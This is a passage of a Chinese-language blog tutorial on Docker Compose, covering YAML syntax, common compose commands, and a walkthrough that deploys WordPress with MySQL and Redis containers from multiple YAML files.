data-target="#collapse-irsr8ulmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-irsr8ulmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">string:</span> <span class="hljs-string">"aliyun"</span><span class="hljs-attr">number1:</span> <span class="hljs-number">10</span><span class="hljs-attr">number2:</span> <span class="hljs-number">10.01</span><span class="hljs-attr">boolean:</span> <span class="hljs-literal">true</span><span class="hljs-comment"># datatime: 2000-01-01 23:59:59   </span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6scspslmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-6scspslmrh9u69"><pre><code class="hljs shell">cat demo2.ymldocker run -i --rm yml/py python 2json.py &lt; demo2.yml</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141356359881_590_image-20230906121351872.png" alt="image-20230906121351872"><figcaption aria-hidden="true">image-20230906121351872</figcaption></figure><ol type="1"><li>YML中的数组</li></ol><p>YML中的数组不需要前后缀，只需要将数组中的元素前加入<code>-</code>即可，一行中只包含一个元素。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pwimp3lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pwimp3lmrh9u69"><pre><code class="hljs shell">vi demo3.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iztirrlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-iztirrlmrh9u69"><pre><code class="hljs shell">scores:     - 100    - 90.5    - 78</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j3eijhlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-j3eijhlmrh9u69"><pre><code class="hljs shell">cat demo3.ymldocker run -i --rm yml/py python 2json.py &lt; demo3.yml</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141400821811_243_image-20230906121553457.png" alt="image-20230906121553457"><figcaption aria-hidden="true">image-20230906121553457</figcaption></figure><h3 id="docker-compose快速上手">Docker Compose快速上手</h3><ol type="1"><li>编写配置文件</li></ol><p><code>docker compose</code>使用YML格式的配置文件代替<code>docker run</code>命令的各种参数，配置文件默认名称为<code>docker-compose.yml</code>。接下来我们使用<code>vi</code>构建该文件</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-miadchlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-miadchlmrh9u69"><pre><code class="hljs shell">vi docker-compose.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y5s264lmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-y5s264lmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">busy:</span>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">busy1</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">"busybox:latest"</span>        <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>        <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span></code></pre></div></div><ol start="2" type="1"><li>启动容器</li></ol><p>配置文件编写完成之后，我们就可以使用<code>docker compose up</code>来启动配置文件中描述的容器。一般在执行dockercompose up时会加入-d参数，其功能类似于dockerrun中的-d，表示容器在后台运行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yd4ev8lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-yd4ev8lmrh9u69"><pre><code class="hljs shell">docker compose up -d</code></pre></div></div><ol start="3" type="1"><li>验证容器启动</li></ol><p>命令执行成功后，我们使用dockerps查看，会发现容器已经启动。相比较使用复杂的docker run命令，使用dockercompose的方式管理容器，命令简单统一。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lawzqjlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-lawzqjlmrh9u69"><pre><code class="hljs shell">docker ps</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141406085546_790_image-20230906122001303.png" alt="image-20230906122001303"><figcaption aria-hidden="true">image-20230906122001303</figcaption></figure><h2 id="docker-compose部署案例">Docker Compose部署案例</h2><h3 id="docker-compose常用命令">Docker Compose常用命令</h3><p>在前面的实验中我们讲解了dockercompose配置文件得常见用法，接下来我们再来学习一下dockercompose的常用命令。</p><ol type="1"><li>环境准备</li></ol><p>首先我们切换到命令行页面。进行试验环境准备。首先安装<code>docker compose</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9fn1vxlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-9fn1vxlmrh9u69"><pre><code class="hljs shell">yum install -y docker-compose-pluginvi docker-compose.yml</code></pre></div></div><p>在安装成功后使用vi创建<code>docker-compose.yml</code>文件，在<code>docker-compose.yml</code>文件中加入下列内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c01ru8lmrh9u69"></i><span>yml</span><div class="collapse show" id="collapse-c01ru8lmrh9u69"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">web:</span>       <span class="hljs-attr">container_name:</span> <span class="hljs-string">web</span>       <span class="hljs-attr">image:</span> <span class="hljs-string">"httpd:latest"</span>       <span class="hljs-attr">ports:</span>          <span class="hljs-bullet">-</span> <span class="hljs-string">"5000:80"</span>          <span class="hljs-bullet">-</span> <span class="hljs-string">"6000:8000"</span>    <span class="hljs-attr">db:</span>       <span class="hljs-attr">container_name:</span> <span class="hljs-string">db</span>       <span class="hljs-attr">image:</span> <span class="hljs-string">"mysql"</span>       <span class="hljs-attr">volumes:</span>          <span class="hljs-bullet">-</span> <span class="hljs-string">"mysql-vol:/var/lib/mysql"</span>       <span class="hljs-attr">environment:</span>          <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">"[MYSQL密码]"</span><span class="hljs-attr">volumes:</span>    <span class="hljs-attr">mysql-vol:</span> {}</code></pre></div></div><blockquote><p>注意设置MYSQL_ROOT_PASSWORD的值，即[MYSQL密码]。</p></blockquote><p>配置文件编写完毕后，我们通过docker compose来启动容器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1chvpplmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-1chvpplmrh9u69"><pre><code class="hljs shell">docker compose up -d</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141411787491_209_image-20230906123052607.png" alt="image-20230906123052607"><figcaption aria-hidden="true">image-20230906123052607</figcaption></figure><ol start="2" type="1"><li>类Docker命令</li></ol><p>接下来我们来测试下面的3条dockercompose命令，这3条命令的用法和原生docker命令类似，不同的是如果命令需要指定特定容器，我们需要在命令中使用service名来代替容器名。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8216tulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-8216tulmrh9u69"><pre><code class="hljs shell">docker compose exec db ls</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wi59eklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-wi59eklmrh9u69"><pre><code class="hljs shell">docker compose cp docker-compose.yml db:/root/docker compose exec db bin/bash -c "cat /root/docker-compose.yml"</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141417586371_108_image-20230906123259414.png" alt="image-20230906123259414"><figcaption aria-hidden="true">image-20230906123259414</figcaption></figure><ol start="3" type="1"><li>容器的启停删除</li></ol><p>接下来我们来看通过dockercompose进行容器服务组暂停/恢复，停止/重开，删除命令，这几条命令类似于dockercomposeup，只要使用默认配置文件docker-compose.yml，或者使用<code>-f</code>参数指定配置文件即可，不再需要指定容器名。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v6lwr2lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-v6lwr2lmrh9u69"><pre><code class="hljs shell">docker compose pausedocker compose unpausedocker compose stopdocker compose restartdocker compose down</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141423088385_967_image-20230906123454662.png" alt="image-20230906123454662"><figcaption aria-hidden="true">image-20230906123454662</figcaption></figure><h3 id="部署wordpress论坛">部署WordPress论坛</h3><p>之前的实验中我们介绍了Docker和DockerCompose的大部分常见用法。接下来我们来部署一个实际WordPress论坛作为Docker的综合案例。</p><p>启动wordpress论坛至少需要创建两个容器，一个mysql数据库容器，和一个运行wordpress的apache容器，除此之外如果安装了redis缓存插件，则还需部署redis容器。因此这次我们编写三个YML文件，通过DockerCompose来部署这三个容器。</p><ol type="1"><li>定义MySQL配置</li></ol><p>首先我们先使用vi来编写<code>db.yml</code>作为MySQL的部署文件。在标准MySQL容器中，通过<code>EntryPoint</code>设置了启动命令，因此我们通过<code>command</code>设置启动参数。</p><p>除此之外标准的MySQL容器可以通过多种环境变量对服务进行配置，此处我们使用<code>MYSQL_DATABASE</code>环境变量指定默认数据库。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qixurnlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-qixurnlmrh9u69"><pre><code class="hljs shell">vi db.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-am6123lmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-am6123lmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3"</span><span class="hljs-attr">services:</span>  <span class="hljs-attr">db:</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:8.0</span>    <span class="hljs-attr">command:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">"--character-set-server=utf8mb4"</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">"--collation-server=utf8mb4_unicode_ci"</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">db_data:/var/lib/mysql</span>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> [<span class="hljs-string">MySQL</span> <span class="hljs-string">root账号密码</span>]      <span class="hljs-attr">MYSQL_DATABASE:</span> <span class="hljs-string">wordpress</span><span class="hljs-attr">volumes:</span>  <span class="hljs-attr">db_data:</span></code></pre></div></div><blockquote><p>注：注意设置MYSQL_ROOT_PASSWORD的值，即[MYSQL密码]。</p></blockquote><ol start="2" type="1"><li>定义Redis配置</li></ol><p>接下来我们使用<code>vi</code>来编写<code>cache.yml</code>作为Redis的部署文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q35k90lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-q35k90lmrh9u69"><pre><code class="hljs shell">vi cache.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uaqssulmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-uaqssulmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3"</span><span class="hljs-attr">services:</span>  <span class="hljs-attr">cache:</span>     <span class="hljs-attr">depends_on:</span>       <span class="hljs-bullet">-</span> <span class="hljs-string">db</span>     <span class="hljs-attr">image:</span> <span class="hljs-string">redis</span>     <span class="hljs-attr">network_mode:</span> <span class="hljs-string">"service:db"</span>     <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span></code></pre></div></div><ol start="3" type="1"><li>定义WordPress配置</li></ol><p>最后我们使用<code>vi</code>来编写<code>app.yml</code>作为WordPress的部署文件。在WordPress配置中，需要依赖<code>db</code>和<code>cache</code>两个服务。使用<code>Container</code>网络模型，绑定``db服务的网卡。</p><p>同时我们希望将在宿主机的<code>8000</code>端口上发布应用的服务。由于WordPress服务共享了db服务的网卡，因此我们需要在<code>db</code>服务的网卡中进行端口绑定，此处我们可以使用属性值的多次定义功能。</p><p>在YML配置文件中，相同的属性值可以在不同的文件中进行定义，在dockercompose加载的时候会将所有的属性值合并后统一处理，因此我们可以在<code>app.yml</code>中为db定义<code>ports</code>端口映射字段。</p><p>除此之外我们还可以在这里对db中的MYSQL_USER和MYSQL_PASSWORD两个环境变量的属性值进行覆盖。YML属性值允许覆盖，且以最后定义的为最终值。</p><p>在对db的环境变量覆盖时，我们可以使用<code>&amp;wp_passwd</code>来将属性值定义为锚点。并且在wordpress中的<code>WORDPRESS_ROOT_PASSWORD</code>使用<code>*wp_passwd</code>来引用锚点作为属性值，这种写法表示这个属性值引用了锚点位置的属性值。也就是说在WordPress中数据库的root用户密码和db.yml中数据库的默认用户密码一致。这种写法可以避免因为拼写错误导致的数值不一致。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wbtxbalmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-wbtxbalmrh9u69"><pre><code class="hljs shell">vi app.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2fu6f9lmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-2fu6f9lmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3"</span><span class="hljs-attr">services:</span>  <span class="hljs-attr">db:</span>    <span class="hljs-attr">ports:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">"8000:80"</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">&amp;wp_passwd</span> [<span class="hljs-string">MySQL</span> <span class="hljs-string">wordpress账号密码</span>]  <span class="hljs-attr">app:</span>    <span class="hljs-attr">depends_on:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">cache</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">wordpress:6.0</span>    <span class="hljs-attr">network_mode:</span> <span class="hljs-string">"service:db"</span>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-attr">WORDPRESS_DB_HOST:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>      <span class="hljs-attr">WORDPRESS_DB_USER:</span> <span class="hljs-string">root</span>      <span class="hljs-attr">WORDPRESS_DB_PASSWORD:</span> <span class="hljs-string">*wp_passwd</span></code></pre></div></div><blockquote><p>注意设置MYSQL_ROOT_PASSWORD的值，即[MYSQL密码]。</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-no3u0rlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-no3u0rlmrh9u69"><pre><code class="hljs shell">version: "3"services:  db:    ports:      - "8000:80"    environment:      MYSQL_ROOT_PASSWORD: &amp;wp_passwd Mysql#pwd  app:    depends_on:      - db      - cache    image: wordpress:6.0    network_mode: "service:db"    restart: always    environment:      WORDPRESS_DB_HOST: 127.0.0.1      WORDPRESS_DB_USER: root      WORDPRESS_DB_PASSWORD: *wp_passwd</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141429798156_187_image-20230906124155038.png" alt="image-20230906124155038"><figcaption aria-hidden="true">image-20230906124155038</figcaption></figure><ol start="4" type="1"><li>启动容器</li></ol><p>配置文件编写完毕后我们就可以启动Project。这里需要注意的时，我们将三个服务写在了三个不同的文件中，当dockercompose需要引用多个配置文件时，我们只需要在参数列表中添加多个<code>-f [配置文件名]</code>的方式即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pqr92tlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pqr92tlmrh9u69"><pre><code class="hljs shell">docker compose -f db.yml -f cache.yml -f app.yml -p wp up -d</code></pre></div></div><blockquote><p>注：<code>-p wp</code>: 指定了项目名称（projectname）<code>wp</code></p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141434316934_189_image-20230906124528944.png" alt="image-20230906124528944"><figcaption aria-hidden="true">image-20230906124528944</figcaption></figure><h3 id="初始化wordpress论坛">初始化WordPress论坛</h3><blockquote><p>注：如果不需要学习使用WordPress，下面两小节内容可以跳过。</p></blockquote><p>接下来我们将在chromium浏览器对WordPress进行图形化配置。</p><ol type="1"><li>在浏览器中访问WordPress</li></ol><p>在浏览器中输入<code>http://[ECS公网地址]:8000</code>，即可进入WordPress初始化界面。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141438141138_443_image-20230906124731571.png" alt="image-20230906124731571"><figcaption aria-hidden="true">image-20230906124731571</figcaption></figure><ol start="2" type="1"><li>初始化WordPress</li></ol><p>在初始化界面中我们首先选择wordpress的界面语言，并且按"继续"</p><p>继续配置wordpress的相关信息，输入论坛名称，用户名，密码等，在邮箱输入栏输入符合标准的邮箱格式即可。然后按"安装WordPress"</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141444671037_311_image-20230906124928415.png" alt="image-20230906124928415"><figcaption aria-hidden="true">image-20230906124928415</figcaption></figure><ol start="3" type="1"><li>登录WordPress</li></ol><p>安装之后点击登录，即可进入登录界面，在登陆界面中输入上一个步骤填写的用户密码并点击登录。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141450295097_479_image-20230906125010078.png" alt="image-20230906125010078" width="50%" height="50%"></p><p>登录之后即可进入wordpress管理后台。后台界面主要由管理员使用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141455440508_502_image-20230906125040580.png" alt="image-20230906125040580"><figcaption aria-hidden="true">image-20230906125040580</figcaption></figure><p>接下来我们进入wordpress前台浏览界面。输入网址<code>http://[ECS公网地址]:8000</code>。出现如下浏览界面即说明wordpress安装成功。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141500006324_531_image-20230906125109079.png" alt="image-20230906125109079"><figcaption aria-hidden="true">image-20230906125109079</figcaption></figure><h3 id="在wordpress中安装插件">在WordPress中安装插件</h3><ol type="1"><li>插件管理</li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141507077816_757_image-20230906125251276.png" alt="image-20230906125251276"><figcaption aria-hidden="true">image-20230906125251276</figcaption></figure><ol start="2" type="1"><li>安装reids插件</li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141511708977_268_image-20230906125321678.png" alt="image-20230906125321678"><figcaption aria-hidden="true">image-20230906125321678</figcaption></figure><p>然后点“启用”</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141517641595_463_image-20230906125416859.png" alt="image-20230906125416859"><figcaption aria-hidden="true">image-20230906125416859</figcaption></figure><p>切换至终端，执行如下命令验证插件生效。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vpvf3ulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-vpvf3ulmrh9u69"><pre><code class="hljs shell">docker exec -it wp-cache-1 redis-clikeys *</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141522028216_638_image-20230906125527715.png" alt="image-20230906125527715"><figcaption aria-hidden="true">image-20230906125527715</figcaption></figure><h2 id="yml配置文件的常用属性">YML配置文件的常用属性</h2><h3 id="yml配置文件简介">YML配置文件简介</h3><p>在上一个小节中我们学习了Docker compose 的基本用法，相比较使用dockerrun命令行和参数启动容器，使用yml配置文件大步幅简化命令输入。在本实验中我们再来看一下docker_compose.yml文件的常见配置信息</p><ol type="1"><li>环境准备</li></ol><p>为了接下来的实验，首先我们安装dockercompose插件。在安装成功后使用vi创建<code>docker-compose.yml</code>文件，在<code>docker-compose.yml</code>文件中加入下列内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7p3i46lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-7p3i46lmrh9u69"><pre><code class="hljs shell">yum install -y docker-compose-pluginvi docker-compose.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9lj3zjlmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-9lj3zjlmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span><span class="hljs-attr">services:</span>    <span class="hljs-attr">web:</span>       <span class="hljs-attr">container_name:</span> <span class="hljs-string">web</span>       <span class="hljs-attr">image:</span> <span class="hljs-string">"httpd:latest"</span>       <span class="hljs-attr">ports:</span>          <span class="hljs-bullet">-</span> <span class="hljs-string">"5000:80"</span>          <span class="hljs-bullet">-</span> <span class="hljs-string">"6000:8000"</span>    <span class="hljs-attr">db:</span>       <span class="hljs-attr">container_name:</span> <span class="hljs-string">db</span>       <span class="hljs-attr">image:</span> <span class="hljs-string">"mysql"</span>       <span class="hljs-attr">volumes:</span>          <span class="hljs-bullet">-</span> <span class="hljs-string">"mysql-vol:/var/lib/mysql"</span>       <span class="hljs-attr">environment:</span>          <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">"[MYSQL密码]"</span><span class="hljs-attr">volumes:</span>    <span class="hljs-attr">mysql-vol:</span> {}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p4f2yqlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-p4f2yqlmrh9u69"><pre><code class="hljs shell">docker compose up -d</code></pre></div></div><ol start="2" type="1"><li>配置文件基本讲解</li></ol><p>在通过<code>docker compose up</code>启动容器之后，我们来看一下<code>docker_comose.yml</code>的配置文件结构。在docker_compose中，一个<code>project</code>可以包含多个配置文件中的内容，如果没有设置所有的资源都会创建在root这个project中，在project中serviecs字段中的每一个key表示一个<code>serviec</code>，每个service下又可以由一个或多个<code>container</code>，在service中的基本配置选项如下表。</p><table><thead><tr class="header"><th>container_name</th><th>等同于--name</th></tr></thead><tbody><tr class="odd"><td>image</td><td>容器镜像</td></tr><tr class="even"><td>volumes</td><td>等价于-v，类型为数组</td></tr><tr class="odd"><td>ports</td><td>等价于-p，类型为数组</td></tr><tr class="even"><td>environment</td><td>等价于-e，类型为对象</td></tr></tbody></table><p>需要注意的是，默认情况下dockercompose会为每个project自动创建一个network，接下来创建的所有的容器都会连接到这个network，我们来验证容器的配置。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f9kcfolmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-f9kcfolmrh9u69"><pre><code class="hljs shell">docker network lsdocker port webdocker inspect -f "{{json .Mounts}}"  db | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141525957802_776_image-20230906132436722.png" alt="image-20230906132436722"><figcaption aria-hidden="true">image-20230906132436722</figcaption></figure><ol start="3" type="1"><li>容器状态查询</li></ol><p>我们还可以通过dockercompose命令对容器服务的状态查询。和使用docker原生命令相比，dockercompose只会对配置文件中包含的容器生效。并不需要具体指定容器名，降低了操作复杂性。</p><p>这里我们演示<code>docker compose ps</code>，<code>docker compose top</code>，<code>docker compose images</code>三个命令：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6sy1molmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-6sy1molmrh9u69"><pre><code class="hljs shell">docker compose psdocker compose topdocker compose images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141532886509_703_image-20230906133510118.png" alt="image-20230906133510118"><figcaption aria-hidden="true">image-20230906133510118</figcaption></figure><ol start="4" type="1"><li>容器的删除</li></ol><p>当我们需要结束容器的使用，我们可以使用<code>docker compose down</code>来结束和删除配置文件中的容器。</p><p>需要注意的时，该命令会停止并且销毁配置文件中描述的容器。同时容器停止后相应的网络等组件都会被销毁，类似于使用<code>docker rm -f</code>加<code>docker network rm</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7t42lflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-7t42lflmrh9u69"><pre><code class="hljs shell">docker compose down</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141538989320_659_image-20230906133558164.png" alt="image-20230906133558164"><figcaption aria-hidden="true">image-20230906133558164</figcaption></figure><h3 id="yml的常用配置项目">YML的常用配置项目</h3><p>在上一个小节中我们演示了dockercompose的主要配置和常用命令，接下来我们再来看一下dockercompose配置文件中的其他配置项目。yml中的一部分配置选项可以和<code>docker  run</code>中的命令行对应，这些属性主要包括在下表中，在本小节中我们来实验这些属性。</p><table><thead><tr class="header"><th>command</th><th>容器的启动命令</th></tr></thead><tbody><tr class="odd"><td>stdin_open</td><td>设置为true等价于-i参数</td></tr><tr class="even"><td>tty</td><td>设置为true等价于-t参数</td></tr><tr class="odd"><td>networ_mode</td><td>网络模式</td></tr><tr class="even"><td>networks</td><td>容器连接的网络，类型为数组</td></tr></tbody></table><ol type="1"><li>编写配置文件。</li></ol><p>在docker compose中默认使用docker-compose.yml配置文件，如果我们想使用不同名称的配置文件，可以在dockercompose后面添加<code>-f</code>参数指定yml文件。我们使用vi创建一个<code>web.yml</code>文件以演示配置选项。</p><p>创建之后，我们启动project，在启动时我们可以通过<code>-p</code>参数指定资源所在的Project，以避免资源橙色图，这里我们指定project为web。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0zg10flmrh9u69"></i><span>shell</span><div class="collapse show" 